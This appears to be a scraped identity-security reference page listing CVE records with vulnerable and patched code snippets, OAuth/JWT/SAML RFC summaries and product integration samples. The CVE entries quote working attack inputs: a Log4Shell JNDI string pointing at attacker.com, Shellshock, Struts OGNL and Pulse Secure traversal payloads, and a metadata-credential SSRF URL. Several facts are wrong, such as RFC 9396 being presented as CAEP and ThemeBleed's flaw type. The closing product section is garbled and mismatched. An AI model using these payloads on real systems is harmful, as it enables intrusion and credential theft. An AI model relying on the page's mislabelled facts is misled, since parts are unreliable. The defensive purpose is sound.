## Critical Identity CVEs & Code-Level Patches
*Read the live research center at:* https://www.aboutiam.com/research/

### CVE Record: CVE-2022-23529 — jsonwebtoken Insecure `secretOrPublicKey` Handling {#cve-cve-2022-23529}
- **CVSS Score Rating:** 7.6 | **Difficulty Level:** Beginner | **Affected Component:** jsonwebtoken (Node.js library)
- **Vulnerability VulnerabilityType:** Algorithm Confusion / Improper Input Validation
- **Vulnerability Description:** Passing an attacker-controlled, untrusted secret or key into `jwt.verify()` lets a caller forge a validly-"signed" token because the library trusts whatever key material it is handed.
- **Exploitation Scenario Attack Vectors:** An app reads the JWKS/secret dynamically from a request parameter or unvalidated config, so an attacker supplies their own key and self-signs an admin token.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: key material comes from an attacker-influenced source
const key = req.query.key || defaultSecret
jwt.verify(token, key)
```
- **Secure Hardened Code Remediation:**
```text
// Secure: fixed server-side secret, explicit algorithm allowlist
jwt.verify(token, SERVER_SECRET, { algorithms: ['HS256'] })
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to jsonwebtoken v9+, always hardcode/allowlist the expected `alg`, and never source verification keys from user-controlled input.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2022-23529

### CVE Record: CVE-2015-9235 — jsonwebtoken `alg: none` Signature Bypass {#cve-cve-2015-9235}
- **CVSS Score Rating:** 9.8 | **Difficulty Level:** Beginner | **Affected Component:** jsonwebtoken (Node.js library, pre-v4)
- **Vulnerability VulnerabilityType:** Missing Signature Verification
- **Vulnerability Description:** Early jsonwebtoken versions honored a JWT header claiming `alg: "none"`, skipping signature verification entirely and accepting any forged payload.
- **Exploitation Scenario Attack Vectors:** Attacker edits the JWT header to `{"alg":"none"}`, strips the signature, and rewrites the payload to `{"role":"admin"}` — the server accepts it unsigned.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: verify() has no algorithm allowlist
jwt.verify(token, secretOrPublicKey)
```
- **Secure Hardened Code Remediation:**
```text
// Secure: explicitly reject "none" and any unexpected algorithm
jwt.verify(token, secretOrPublicKey, { algorithms: ['RS256'] })
```
- **Detailed Remediation & Patch Guidelines:** Upgrade past jsonwebtoken v4.0.0 and always pass an explicit `algorithms` allowlist to `verify()` so `none` is rejected outright.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2015-9235

### CVE Record: CVE-2015-2951 — PyJWT `alg: none` Signature Bypass {#cve-cve-2015-2951}
- **CVSS Score Rating:** 9.8 | **Difficulty Level:** Beginner | **Affected Component:** PyJWT (Python library, pre-1.3.0)
- **Vulnerability VulnerabilityType:** Missing Signature Verification
- **Vulnerability Description:** PyJWT versions before 1.3.0 did not reject a JWT whose header claimed `alg: "none"`, allowing `jwt.decode()` to accept an unsigned, attacker-forged token as valid.
- **Exploitation Scenario Attack Vectors:** Attacker strips the signature from a captured token, rewrites the header to `{"alg":"none"}` and the payload to an admin claim, and `jwt.decode()` accepts it without verifying anything.
- **Insecure Vulnerable Code Snippet:**
```text
# Vulnerable: no algorithms allowlist passed to decode()
payload = jwt.decode(token, key)
```
- **Secure Hardened Code Remediation:**
```text
# Secure: explicit algorithm allowlist rejects "none"
payload = jwt.decode(token, key, algorithms=['RS256'])
```
- **Detailed Remediation & Patch Guidelines:** Upgrade past PyJWT 1.3.0 and always pass an explicit `algorithms=[...]` allowlist to `jwt.decode()` so `none` can never be negotiated.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2015-2951

### CVE Record: CVE-2016-7036 — python-jose RSA/HMAC Key-Confusion Signature Forgery {#cve-cve-2016-7036}
- **CVSS Score Rating:** 8.1 | **Difficulty Level:** Intermediate | **Affected Component:** python-jose (Python library)
- **Vulnerability VulnerabilityType:** Algorithm Confusion
- **Vulnerability Description:** python-jose's decode path did not enforce that the key type matched the algorithm family in the token header, so a token signed `HS256` could be verified against an RSA public key treated as an HMAC secret.
- **Exploitation Scenario Attack Vectors:** A server distributes its RS256 public key for verification; an attacker signs a forged token with `alg: HS256` using that public key as the HMAC secret, and the library accepts it as valid.
- **Insecure Vulnerable Code Snippet:**
```text
# Vulnerable: no algorithm allowlist, so alg confusion is possible
claims = jose_jwt.decode(token, rsa_public_key)
```
- **Secure Hardened Code Remediation:**
```text
# Secure: explicit algorithm allowlist matching the key type
claims = jose_jwt.decode(token, rsa_public_key, algorithms=['RS256'])
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to a patched python-jose release and always pass an explicit `algorithms=[...]` allowlist to `jwt.decode()`, matching the key type actually in use.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2016-7036

### CVE Record: CVE-2019-7644 — node-samlify Signature Wrapping (SAML Auth Bypass) {#cve-cve-2019-7644}
- **CVSS Score Rating:** 9.8 | **Difficulty Level:** Intermediate | **Affected Component:** node-samlify / SAML SP libraries
- **Vulnerability VulnerabilityType:** XML Signature Wrapping (SSW)
- **Vulnerability Description:** The SAML response parser located and validated a signed `<Assertion>` node, but a separate code path read identity claims from the first `<Assertion>` in document order — an attacker could wrap a legitimately-signed assertion around a forged, unsigned one.
- **Exploitation Scenario Attack Vectors:** Attacker intercepts a valid SAML response, duplicates the signed Assertion as a decoy, and inserts a new unsigned Assertion claiming `admin@victim.com` that the SP reads identity from.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: reads claims from document order, not the signed reference
const assertion = xml.querySelector('Assertion')
const user = assertion.querySelector('NameID').textContent
```
- **Secure Hardened Code Remediation:**
```text
// Secure: resolve the signed node via the signature's Reference URI
const signedId = signature.querySelector('Reference').getAttribute('URI').slice(1)
const assertion = xml.getElementById(signedId)
const user = assertion.querySelector('NameID').textContent
```
- **Detailed Remediation & Patch Guidelines:** Upgrade the SAML library, and ensure the code that extracts claims operates on the exact node the `<ds:Reference URI>` in the signature points to — never "the first assertion in the document."
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2019-7644

### CVE Record: CVE-2020-13379 — Grafana Unauthenticated Avatar Proxy SSRF (Credential Leak) {#cve-cve-2020-13379}
- **CVSS Score Rating:** 7.5 | **Difficulty Level:** Intermediate | **Affected Component:** Grafana (avatar/gravatar proxy)
- **Vulnerability VulnerabilityType:** Server-Side Request Forgery
- **Vulnerability Description:** The unauthenticated `/avatar/` endpoint proxied arbitrary attacker-supplied URLs server-side, allowing internal network reconnaissance and metadata-service credential theft.
- **Exploitation Scenario Attack Vectors:** Attacker requests `/avatar/<hash>` crafted to resolve internally, causing Grafana to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and leak cloud IAM role credentials in the response.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: proxies any URL derived from user-controlled input
app.get('/avatar/:hash', (req, res) => proxyFetch(resolveAvatarUrl(req.params.hash)).pipe(res))
```
- **Secure Hardened Code Remediation:**
```text
// Secure: allowlist outbound hosts and block internal/link-local ranges
if (!isAllowedAvatarHost(url) || isLinkLocalOrPrivate(url)) throw new Error('blocked')
```
- **Detailed Remediation & Patch Guidelines:** Upgrade Grafana to a patched release and block outbound requests from app servers to the cloud metadata IP range at the network layer.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2020-13379

### CVE Record: CVE-2021-27582 — FreeRADIUS EAP-pwd Buffer Over-read {#cve-cve-2021-27582}
- **CVSS Score Rating:** 7.5 | **Difficulty Level:** Intermediate | **Affected Component:** FreeRADIUS (rlm_eap_pwd)
- **Vulnerability VulnerabilityType:** Out-of-Bounds Read
- **Vulnerability Description:** A crafted EAP-pwd Commit frame with an invalid scalar/element could cause the RADIUS server to read past an allocated buffer during Wi-Fi/802.1X authentication, crashing the auth service.
- **Exploitation Scenario Attack Vectors:** Attacker joins the wireless authentication exchange and sends a malformed EAP-pwd Commit packet, denying authentication service to legitimate users on the network.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: trusts attacker-supplied length without bounds validation
memcpy(out, packet->scalar, packet->scalar_len); // scalar_len unchecked
```
- **Secure Hardened Code Remediation:**
```text
// Secure: validate length against the expected fixed field size first
if (packet->scalar_len != EXPECTED_SCALAR_LEN) return EAP_FAIL;
memcpy(out, packet->scalar, packet->scalar_len);
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to a patched FreeRADIUS release; validate scalar/element bounds before use in the EAP-pwd state machine.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2021-27582

### CVE Record: CVE-2023-38146 — Windows Themes Remote Code Execution (ThemeBleed) {#cve-cve-2023-38146}
- **CVSS Score Rating:** 8.8 | **Difficulty Level:** Intermediate | **Affected Component:** Windows Themes / API Layer
- **Vulnerability VulnerabilityType:** Integer Overflow
- **Vulnerability Description:** Vulnerability in the Windows Themes API where opening a crafted `.theme` file loads a remote DLL without certificate validation.
- **Exploitation Scenario Attack Vectors:** Victim downloads or previews a malicious theme package, triggering an automatic RPC call that loads the attacker's DLL.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: Loads DLL from arbitrary remote SMB directories
LoadLibraryExW("\\remote-smb\share\theme.dll", NULL, LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR);
```
- **Secure Hardened Code Remediation:**
```text
// Secure: Restrict DLL load paths to verified local system folder paths
LoadLibraryExW("C:\\Windows\\System32\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
```
- **Detailed Remediation & Patch Guidelines:** Apply Microsoft September 2023 KB updates or disable the Windows Themes service if unnecessary.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2023-38146

### CVE Record: CVE-2024-21626 — runc container escape (Filesystem Leak) {#cve-cve-2024-21626}
- **CVSS Score Rating:** 8.6 | **Difficulty Level:** Advanced | **Affected Component:** runc (container runtime)
- **Vulnerability VulnerabilityType:** Directory Traversal
- **Vulnerability Description:** Internal file descriptors kept open during runc execution allow containerized processes to access host directory paths, leading to container escapes.
- **Exploitation Scenario Attack Vectors:** Attacker deploys a malicious container image that exploits open file descriptors to execute host command shells as root.
- **Insecure Vulnerable Code Snippet:**
```text
// Insecure execution mapping
execve("/proc/self/fd/7/...", args, env);
```
- **Secure Hardened Code Remediation:**
```text
// Secure runtime descriptor isolation
close_open_fds_except(3); // Hard lock FDs before container execution
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to runc v1.1.12 or later to enforce strict descriptor lockdowns on container boot cycles.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2024-21626

### CVE Record: CVE-2022-22965 — Spring4Shell Remote Code Execution {#cve-cve-2022-22965}
- **CVSS Score Rating:** 9.8 | **Difficulty Level:** Advanced | **Affected Component:** Spring Framework (Java)
- **Vulnerability VulnerabilityType:** Class Loader Manipulation
- **Vulnerability Description:** Allows remote attackers to manipulate the class loader via parameter binding, enabling them to upload arbitrary web shells into host servers.
- **Exploitation Scenario Attack Vectors:** Attacker sends a crafted HTTP POST request with query parameters targeting `class.module.classLoader` to rewrite Apache Tomcat logs.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: Permissive class properties mapping
PropertyDescriptorDescriptor pd = getPropertyDescriptor(beanClass, name);
// Evaluates deep properties mapping like class.module.classLoader
```
- **Secure Hardened Code Remediation:**
```text
// Secure: Whitelist properties or explicitly deny classLoader parameters
if (name.contains("classLoader") || name.contains("protectionDomain")) {
  throw new SecurityException("Unauthorized parameter binding!");
}
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to Spring Framework v5.3.18 / v5.2.20 or later to restrict active classloader parameters.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2022-22965

### CVE Record: CVE-2021-44228 — Log4Shell (Remote Code Execution) {#cve-cve-2021-44228}
- **CVSS Score Rating:** 10 | **Difficulty Level:** Advanced | **Affected Component:** Apache Log4j2 (Java)
- **Vulnerability VulnerabilityType:** JNDI LDAP Injection
- **Vulnerability Description:** Log4j2 parsing handles JNDI lookups (e.g. `${jndi:ldap://}`) automatically on log evaluations, letting servers load and execute remote classes.
- **Exploitation Scenario Attack Vectors:** Attacker inserts `${jndi:ldap://attacker.com/a}` into an HTTP User-Agent header. Log4j logs the header, triggers JNDI, and runs the payload.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: Log4j parses nested lookup formats automatically
logger.info("User Agent: " + userAgent);
// Evaluates: "${jndi:ldap://attacker-domain/exploit}"
```
- **Secure Hardened Code Remediation:**
```text
// Secure: Interpolate logs safely as static arguments, disabling nested lookups
logger.info("User Agent: {}", userAgent); // Interpolation blocks recursive evaluation
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to Log4j v2.17.1 or later. Alternatively, set `FORMAT_MSG_NO_LOOKUPS=true` or remove the JndiLookup class.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2021-44228

### CVE Record: CVE-2020-1472 — Zerologon — Netlogon Elevation of Privilege {#cve-cve-2020-1472}
- **CVSS Score Rating:** 10 | **Difficulty Level:** Advanced | **Affected Component:** Windows Netlogon Remote Protocol (AD Domain Controller)
- **Vulnerability VulnerabilityType:** Weak Cryptographic Implementation
- **Vulnerability Description:** A flawed AES-CFB8 implementation in the Netlogon handshake let an unauthenticated attacker forge a valid Netlogon session and reset the Domain Controller's machine account password to an empty string.
- **Exploitation Scenario Attack Vectors:** Attacker on the internal network repeatedly authenticates as the DC computer account (success probability ~1/256 per try) until the crypto weakness lets them zero out its password, then impersonates the DC to dump the entire domain's credentials.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: uses a fixed all-zero IV, letting forged 8-byte challenges succeed statistically
AES_CFB8_Encrypt(clientChallenge, sessionKey, iv=ZERO_IV);
```
- **Secure Hardened Code Remediation:**
```text
// Secure: enforce Secure RPC (signing+sealing) for every Netlogon channel, no fallback
if (!(flags & NETLOGON_SECURE_RPC)) { RejectConnection(); }
```
- **Detailed Remediation & Patch Guidelines:** Apply the August 2020 Microsoft patch and enable enforcement mode requiring secure RPC for all Netlogon connections.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2020-1472

### CVE Record: CVE-2014-6271 — Shellshock — Bash Environment Variable Command Injection {#cve-cve-2014-6271}
- **CVSS Score Rating:** 9.8 | **Difficulty Level:** Advanced | **Affected Component:** GNU Bash
- **Vulnerability VulnerabilityType:** Command Injection
- **Vulnerability Description:** Bash incorrectly continued parsing and executing shell commands appended after a specially-crafted function definition stored in an environment variable, letting CGI-style identity/auth gateways execute attacker code.
- **Exploitation Scenario Attack Vectors:** Attacker sends `User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"` to a CGI-backed SSO/auth gateway that forwards headers into environment variables read by Bash.
- **Insecure Vulnerable Code Snippet:**
```text
# Vulnerable: environment variable trusted and passed straight to bash
export HTTP_USER_AGENT="$1"
bash -c 'echo "$HTTP_USER_AGENT"'
```
- **Secure Hardened Code Remediation:**
```text
# Secure: never source untrusted headers into a shell environment; use exec-family APIs with args, not a shell
subprocess.run(["echo", user_agent], shell=False)
```
- **Detailed Remediation & Patch Guidelines:** Patch Bash to a version that stops parsing after the function definition, and avoid passing untrusted input into subprocess environment variables entirely.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2014-6271

### CVE Record: CVE-2017-5638 — Apache Struts 2 OGNL Remote Code Execution {#cve-cve-2017-5638}
- **CVSS Score Rating:** 10 | **Difficulty Level:** Beginner | **Affected Component:** Apache Struts 2 (Jakarta Multipart parser)
- **Vulnerability VulnerabilityType:** OGNL Expression Injection
- **Vulnerability Description:** A malformed `Content-Type` header during file upload triggered an unhandled exception whose error message was evaluated as an OGNL expression, letting an unauthenticated attacker run arbitrary server commands.
- **Exploitation Scenario Attack Vectors:** Attacker sends a POST request with `Content-Type: %{(#cmd='id').(#process=@java.lang.Runtime@getRuntime().exec(#cmd))}`, and Struts evaluates it as code instead of a literal header.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: exception text derived from the raw header is OGNL-evaluated
throw new LocalizedMessage(this.getClass(), contentTypeHeader, null, null);
```
- **Secure Hardened Code Remediation:**
```text
// Secure: sanitize/escape header values and never feed raw input into an expression evaluator
String safe = OgnlSanitizer.escape(contentTypeHeader);
```
- **Detailed Remediation & Patch Guidelines:** Upgrade to a patched Struts 2 release; never evaluate user-controlled input (including headers) as an OGNL/EL expression.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2017-5638

### CVE Record: CVE-2019-11510 — Pulse Secure VPN Arbitrary File Read (Credential Theft) {#cve-cve-2019-11510}
- **CVSS Score Rating:** 10 | **Difficulty Level:** Beginner | **Affected Component:** Pulse Connect Secure (SSL VPN)
- **Vulnerability VulnerabilityType:** Path Traversal / Pre-Auth File Disclosure
- **Vulnerability Description:** An unauthenticated path-traversal request against the VPN's web interface could read arbitrary files, including cached plaintext credentials and session cookies used for SSO into the internal network.
- **Exploitation Scenario Attack Vectors:** Attacker sends `GET /dana-na/../dana/html5acc/guacamole/../../../../etc/passwd?/dana/html5acc/guacamole/` to dump session databases and harvest active SSO session tokens without logging in.
- **Insecure Vulnerable Code Snippet:**
```text
// Vulnerable: user-supplied path segments concatenated directly into a filesystem read
String path = webroot + request.getParameter("file");
return new FileInputStream(path);
```
- **Secure Hardened Code Remediation:**
```text
// Secure: canonicalize and verify the resolved path stays inside the webroot
Path resolved = Paths.get(webroot, filename).normalize();
if (!resolved.startsWith(webroot)) throw new SecurityException("traversal blocked");
```
- **Detailed Remediation & Patch Guidelines:** Apply the vendor security patch immediately and rotate all credentials/session secrets exposed on the appliance after any suspected compromise.
- **View Live CVE Details:** https://www.aboutiam.com/research/?cve=CVE-2019-11510

## Protocols & Core RFCs Registry
*Read the live protocol registry at:* https://www.aboutiam.com/research/

### RFC Profile: RFC 6749 — The OAuth 2.0 Authorization Framework {#rfc-rfc-6749}
- **Status:** Live | **Category:** Federation & Delegation | **Difficulty:** Beginner
- **RFC Protocol Overview:** The industry-standard protocol for token-based delegation, defining Authorization Code, Implicit, Resource Owner Credentials, and Client Credentials flows.
- **Actionable Developer Security Takeaway:** Deprecates implicit and password grants in modern client configurations in favor of authorization codes with PKCE.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-6749

### RFC Profile: RFC 7519 — JSON Web Token (JWT) {#rfc-rfc-7519}
- **Status:** Live | **Category:** Tokens | **Difficulty:** Beginner
- **RFC Protocol Overview:** Defines a compact, self-contained JSON structure for cryptographically sharing claims (identity context) across system boundaries.
- **Actionable Developer Security Takeaway:** Always validate signatures (using standard algorithms, avoiding alg: "none") and verify claims (iss, exp, aud) on receipt.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7519

### RFC Profile: RFC 6238 — TOTP: Time-Based One-Time Password Algorithm {#rfc-rfc-6238}
- **Status:** Live | **Category:** Multi-Factor Authentication | **Difficulty:** Beginner
- **RFC Protocol Overview:** Extends HOTP (RFC 4226) with a time-step counter, producing a rotating 6-digit code from a shared secret and the current Unix time.
- **Actionable Developer Security Takeaway:** Servers must allow a small clock-skew window (±1 step) and reject reused codes to stop replay within the same time step.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-6238

### RFC Profile: RFC 4511 — Lightweight Directory Access Protocol (LDAP): The Protocol {#rfc-rfc-4511}
- **Status:** Live | **Category:** Directory Services | **Difficulty:** Beginner
- **RFC Protocol Overview:** Defines the wire protocol for querying and modifying hierarchical directory information trees (DITs) used by Active Directory and OpenLDAP.
- **Actionable Developer Security Takeaway:** Always bind over LDAPS/StartTLS — plain LDAP binds transmit credentials and search results unencrypted.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-4511

### RFC Profile: RFC 7636 — Proof Key for Code Exchange (PKCE) by Mobile/SPA Clients {#rfc-rfc-7636}
- **Status:** Live | **Category:** Security Extensions | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Mitigates authorization code interception attacks on public clients by requiring cryptographical code challenge/verifier validations.
- **Actionable Developer Security Takeaway:** Mandatory for all Single Page Applications (SPAs) and native mobile apps to block code replay exploits.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7636

### RFC Profile: RFC 7643 — SCIM 2.0: Core Schema Definition {#rfc-rfc-7643}
- **Status:** Live | **Category:** Provisioning | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Specifies the common identity schemas (Users, Groups) to enable automated lifecycle management across distinct software directories.
- **Actionable Developer Security Takeaway:** Enforces standard LDAP-like JSON mappings (e.g. givenName, familyName, emails, active) across SaaS target networks.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7643

### RFC Profile: RFC 7644 — SCIM 2.0: Protocol {#rfc-rfc-7644}
- **Status:** Live | **Category:** Provisioning | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Defines the REST API bindings (GET/POST/PUT/PATCH/DELETE, filtering, bulk operations) that move SCIM Core Schema resources between IdP and SP.
- **Actionable Developer Security Takeaway:** PATCH operations must be applied atomically — a partially-applied bulk PATCH can leave a user mid-provisioned with stale group membership.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7644

### RFC Profile: RFC 7009 — OAuth 2.0 Token Revocation {#rfc-rfc-7009}
- **Status:** Live | **Category:** Tokens | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Defines a standard endpoint for clients to explicitly invalidate an access or refresh token before its natural expiry.
- **Actionable Developer Security Takeaway:** Revoking a refresh token should cascade to invalidate every access token issued from it, not just the token presented.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7009

### RFC Profile: RFC 7662 — OAuth 2.0 Token Introspection {#rfc-rfc-7662}
- **Status:** Live | **Category:** Tokens | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Lets a resource server ask the authorization server whether an opaque or JWT access token is still active, and retrieve its metadata.
- **Actionable Developer Security Takeaway:** Required for opaque (non-JWT) tokens, since a resource server has no local way to validate their claims or expiry otherwise.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-7662

### RFC Profile: RFC 8414 — OAuth 2.0 Authorization Server Metadata {#rfc-rfc-8414}
- **Status:** Live | **Category:** Discovery | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Standardizes a `/.well-known/oauth-authorization-server` JSON document advertising endpoints, supported grants, and signing algorithms.
- **Actionable Developer Security Takeaway:** Clients should fetch and cache this document rather than hardcoding authorization/token endpoint URLs, easing IdP migrations.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-8414

### RFC Profile: RFC 8628 — OAuth 2.0 Device Authorization Grant {#rfc-rfc-8628}
- **Status:** Live | **Category:** Federation & Delegation | **Difficulty:** Intermediate
- **RFC Protocol Overview:** Enables sign-in on input-constrained devices (smart TVs, CLIs) by displaying a short user code the user enters on a second device.
- **Actionable Developer Security Takeaway:** The device must poll the token endpoint at the server-specified interval — polling faster returns a `slow_down` error.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-8628

### RFC Profile: RFC 4120 — The Kerberos Network Authentication Service (V5) {#rfc-rfc-4120}
- **Status:** Live | **Category:** Enterprise Authentication | **Difficulty:** Advanced
- **RFC Protocol Overview:** Defines ticket-based mutual authentication using a trusted Key Distribution Center (KDC) issuing TGTs and service tickets encrypted with symmetric keys.
- **Actionable Developer Security Takeaway:** A compromised krbtgt account key lets an attacker forge unlimited "Golden Tickets" — rotate it twice after any suspected domain compromise.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-4120

### RFC Profile: RFC 9068 — JWT Profile for OAuth 2.0 Access Tokens {#rfc-rfc-9068}
- **Status:** Live | **Category:** Tokens | **Difficulty:** Advanced
- **RFC Protocol Overview:** Standardizes claims (iss, exp, aud, client_id, scope) so JWT-formatted access tokens are interoperable across authorization servers.
- **Actionable Developer Security Takeaway:** Resource servers must still validate `aud` — a validly-signed JWT meant for a different API must not be accepted just because the signature checks out.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-9068

### RFC Profile: RFC 9449 — OAuth 2.0 Demonstrating Proof-of-Possession (DPoP) {#rfc-rfc-9449}
- **Status:** Live | **Category:** Security Extensions | **Difficulty:** Advanced
- **RFC Protocol Overview:** Sender-constrains bearer tokens by binding them to a client-held key pair, proven via a signed DPoP JWT on every request.
- **Actionable Developer Security Takeaway:** Defeats bearer-token replay from a stolen token alone — the attacker also needs the client's private signing key.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-9449

### RFC Profile: RFC 9396 — Continuous Access Evaluation Protocol (CAEP / SSF) {#rfc-rfc-9396}
- **Status:** Live | **Category:** Zero Trust | **Difficulty:** Advanced
- **RFC Protocol Overview:** Defines real-time event sharing schemas (session termination, device changes) to allow Identity Providers to push instant security posture updates.
- **Actionable Developer Security Takeaway:** Enables continuous token audits instead of waiting for standard 1-hour JWT expiration periods.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-9396

### RFC Profile: RFC 9635 — Grant Negotiation and Authorization Protocol (GNAP) {#rfc-rfc-9635}
- **Status:** Draft | **Category:** Next-Gen Standards | **Difficulty:** Advanced
- **RFC Protocol Overview:** A ground-up redesign of delegated authorization covering non-redirect-based clients, multiple access tokens per grant, and richer interaction modes than OAuth 2.0.
- **Actionable Developer Security Takeaway:** Not a drop-in OAuth replacement — GNAP models grants, tokens, and interaction as distinct first-class resources with their own lifecycle.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=rfc-9635

### RFC Profile: OAuth 2.1 — OAuth 2.1 Security Best Practices (Draft) {#rfc-oauth-2-1}
- **Status:** Draft | **Category:** Next-Gen Standards | **Difficulty:** Advanced
- **RFC Protocol Overview:** Consolidates ten years of security patches, making PKCE mandatory, deprecating implicit/resource owner grants, and enforcing exact redirect matching.
- **Actionable Developer Security Takeaway:** Modernizes and hardens the baseline OAuth 2.0 spec, closing structural redirect and token leakage gaps.
- **View Live RFC Details:** https://www.aboutiam.com/research/?rfc=oauth-2-1

## Enterprise Identity Landscape Directory
*Read the live landscape directory at:* https://www.aboutiam.com/explore/

### Product Profile: Keycloak {#product-keycloak}
- **Product Type:** Open Source | **Difficulty Level:** Beginner | **License:** Apache-2.0
- **Standard Deployment Formats:** Self-hosted (Docker, Kubernetes, Bare-Metal)
- **Optimal System Use Cases:** Best for standard, highly customizable, and fully self-hosted Open Source Identity Provider (IdP) infrastructures.
- **Supported Identity Standards:** OIDC: Yes | SAML: Yes | SCIM: No | FIDO2: Yes | LDAP: Yes
- **Search Keywords:** self-hosted, realm, admin console, open source idp
- **Sample Integration Code Block:**
```text
# Spring Security Configuration for Keycloak OIDC
spring:
  security:
    oauth2:
      client:
        registration:
          keycloak:
            client-id: aboutiam-spa
            client-secret: sec_keycloak_9922a
            scope: openid, profile, email
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
        provider:
          keycloak:
            issuer-uri: https://auth.company.com/realms/aboutiam
```
- **View Live Product Profile Details:** https://www.aboutiam.com/explore/?product=keycloak

### Product Profile: HashiCorp Vault {#product-hashicorp-vault}
- **Product Type:** Secrets Engine | **Difficulty Level:** Intermediate | **License:** BSL 1.1 / Commercial
- **Standard Deployment Formats:** Self-hosted (Binary, Helm) / Managed Cloud
- **Optimal System Use Cases:** The leading centralized secret engine, storing passwords, API keys, and dynamically issuing ephemeral database users.
- **Supported Identity Standards:** OIDC: Yes | SAML: No | SCIM: No | FIDO2: No | LDAP: Yes
- **Search Keywords:** secrets management, dynamic secrets, kv engine, transit
- **Sample Integration Code Block:**
```text
# Enable OIDC Auth Role in HashiCorp Vault CLI
vault auth enable oidc

vault write auth/oidc/config \
    oidc_discovery_url="https://auth.company.com/realms/aboutiam" \
    oidc_client_id="vault-client-id" \
    oidc_client_secret="sec_vault_002"

vault write auth/oidc/role/developer \
    user_claim="sub" \
    allowed_redirect_uris="https://vault.company.com/ui/vault/auth/oidc/oidc/callback" \
    policies="developer-policy" \
    ttl="1h"
```
- **View Live Product Profile Details:** https://www.aboutiam.com/explore/?product=hashicorp-vault

### Product Profile: Ory (Kratos + Hydra) {#product-ory}
- **Product Type:** Open Source | **Difficulty Level:** Advanced | **License:** Apache-2.0
- **Standard Deployment Formats:** Self-hosted (Docker, Kubernetes) / Ory Network Managed Cloud
- **Optimal System Use Cases:** API-first, headless identity and OAuth2 server stack for teams building fully custom login UIs on top of a hardened backend.
- **Supported Identity Standards:** OIDC: Yes | SAML: No | SCIM: No | FIDO2: Yes | LDAP: No
- **Search Keywords:** headless, api-first, oauth2 server, kratos, hydra
- **Sample Integration Code Block:**
```text
# Ory Kratos self-service login flow (curl)
curl -s -X GET \
  "https://playground.projects.oryapis.com/self-service/login/api" \
  -H "Accept: application/json" | jq '.ui.nodes'

# Submit credentials to the returned action URL
curl -s -X POST "$ACTION_URL" \
  -H "Content-Type: application/json" \
  -d '{"method":"password","identifier":"user@aboutiam.com","password":"hunter2"}'
```

- **Sample Integration Code Block:**
```text
# Zitadel machine-to-machine JWT profile token request

  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$SIGNED_JWT" \
  -d "scope=openid profile urn:zitadel:iam:org:project:id:zitadel:aud"
```

```text
dn: uid=jane,ou=people,dc=aboutiam,dc=com
objectClass: inetOrgPerson
uid: jane
cn: Jane Doe
sn: Doe
mail: jane@aboutiam.com
EOF
```
